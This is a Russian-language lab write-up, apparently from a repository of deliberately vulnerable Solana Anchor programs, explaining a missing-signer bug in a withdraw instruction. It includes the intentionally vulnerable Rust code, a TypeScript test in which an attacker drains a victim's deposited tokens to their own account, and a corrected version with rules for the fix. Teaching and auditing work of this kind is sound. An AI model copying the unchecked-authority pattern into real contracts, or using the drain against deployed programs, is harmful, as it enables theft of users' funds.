# 01 — Отсутствие проверки подписи/владельца при выводе средств

**Класс:** Missing signer / missing authority check.
**Файлы:** `programs/vuln01_missing_signer/`, `tests/01_missing_signer.test.ts`.
**Последствие:** полный дрейн токен-баланса жертвы одной транзакцией.

## 1. Суть уязвимости

В Solana авторизация не «неявная»: инструкция сама решает, чьё имя она действует
от. Если инструкция двигает чужие средства и при этом:

- не требует `Signer<'info>` для владельца баланса,
- не имеет `#[account(has_one = owner)]`,
- не привязывает аккаунт к PDA-сеятельству с ключом владельца,

— то **любой** пользователь может вызвать её, указав чужой баланс, и получить
деньги себе.

Anchor проверяет, что переданные аккаунты — подписанты транзакции, только если
тип поля — `Signer`. Если поле объявлено как обычный `Account`/`UncheckedAccount`,
программа получает аккаунт без подписи, и это **не ошибка времени выполнения**.

## 2. Уязвимый код

```rust
#[derive(Accounts)]
pub struct Withdraw<'info> {
    // БАГ: не Signer, нет has_one, нет seeds — кто угодно может «вывести»
    #[account(mut)]
    pub user_balance: Account<'info, UserBalance>,
    /// CHECK: пользователь... должен быть владельцем — но это не проверяется!
    pub authority: UncheckedAccount<'info>,
    #[account(mut)]
    pub destination_ata: Account<'info, TokenAccount>, // назначение не проверяется
    #[account(mut, seeds = [b"vault"], bump)]
    pub vault: Account<'info, TokenAccount>,
    pub token_program: Program<'info, Token>,
}

pub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {
    let bal = &mut ctx.accounts.user_balance;
    bal.amount = bal.amount.checked_sub(amount).unwrap(); // уменьшили чужой баланс

    let vault_bump = ctx.bumps.vault;
    token::transfer( // из общего хранилища — куда сказали
        CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vault.to_account_info(),
                to: ctx.accounts.destination_ata.to_account_info(),
                authority: ctx.accounts.vault.to_account_info(),
            },
            &[&[b"vault".as_ref(), &[vault_bump]]],
        ),
        amount,
    )
}
```

Программа честно уменьшает `user_balance.amount` и честно переводит токены из
vault — но никого не спросила, кому принадлежит `user_balance` и куда разрешено
переводить.

## 3. Как эксплуатируется

Тест `tests/01_missing_signer.test.ts`:

1. Жертва депонирует 1000 токенов: `deposit(1000)` с её подписью. В `UserBalance`
   PDA жертвы — 1000, в общем vault — 1000.
2. Атакующий **вообще не имеет подписи жертвы**: он собирает инструкцию
   `withdraw(1000)` и подставляет:
   - `userBalance` = PDA **жертвы**,
   - `authority` = свой ключ (достаточно, чтобы он подписал транзакцию — но он
     никем не проверяется),
   - `destinationAta` = **свой** ATA.
3. Транзакция подписана только атакующим (`sendSelfSigned(..., attacker)`).

```ts
await sendSelfSigned([
  await program.methods.withdraw(new BN(1000)).accounts({
    userBalance: victimBalance,          // ЧУЖОЙ баланс
    authority: attacker.publicKey,       // БАГ: не проверяется
    destinationAta: attackerAta,         // БАГ: ни к чему не привязан
    vault: vaultPda,
  }).instruction(),
], attacker);
```

## 4. Результат атаки (проверяется тестом)

```ts
assert.equal((await tokenBalance(attackerAta)).toString(), "1000"); // всё у жертвы
assert.equal((await tokenBalance(vaultPda)).toString(), "0");
```

Атакующий получил 1000 токенов жертвы. Жертва ничего не подписывала и даже
не знала об атаке.

## 5. Реальные кейсы

- Класс «missing signer» — один из самых частых по отчётам аудиторов:
  Neodyme («Think Memory, Not What», 2021) и Sec3 (сканер PA) публиковали
  статистику, что значительная доля програм Solana не проверяла подписантов
  для чувствительных инструкций. Протоколы с выводом без `Signer` теряли
  депозиты целиком, злоумышленнику хватало одной транзакции.
- Та же механика (не тот владелец / не тот подписант) лежала в основе ряда
  инцидентов 2022 года, включая Crema Finance (~$8.9M), где атакующий
  подменял аккаунты, связанные с владением позицией.

## 6. Исправление

```rust
#[derive(Accounts)]
pub struct WithdrawFixed<'info> {
    #[account(
        mut,
        seeds = [b"balance", owner.key().as_ref()],
        bump,
        has_one = owner           // баланс принадлежит именно owner
    )]
    pub user_balance: Account<'info, UserBalance>,
    pub owner: Signer<'info>,                 // ТОЛЬКО владелец может позвать
    #[account(
        mut,
        constraint = destination_ata.owner == owner.key()  // вывод — себе
        @ Fault::BadDestination
    )]
    pub destination_ata: Account<'info, TokenAccount>,
    #[account(mut, seeds = [b"vault"], bump)]
    pub vault: Account<'info, TokenAccount>,
    pub token_program: Program<'info, Token>,
}
```

Правила:

1. Любое поле, от которого зависит право распоряжаться средствами, — либо
   `Signer`, либо связано с ним через `has_one`/`seeds`/`constraint`.
2. Адрес назначения перевода обязан проходить `constraint` на владельца.
3. Никогда не принимать «authority» как `UncheckedAccount`.

## 7. Запуск

```bash
./scripts/run_tests.sh tests/01_missing_signer.test.ts
```
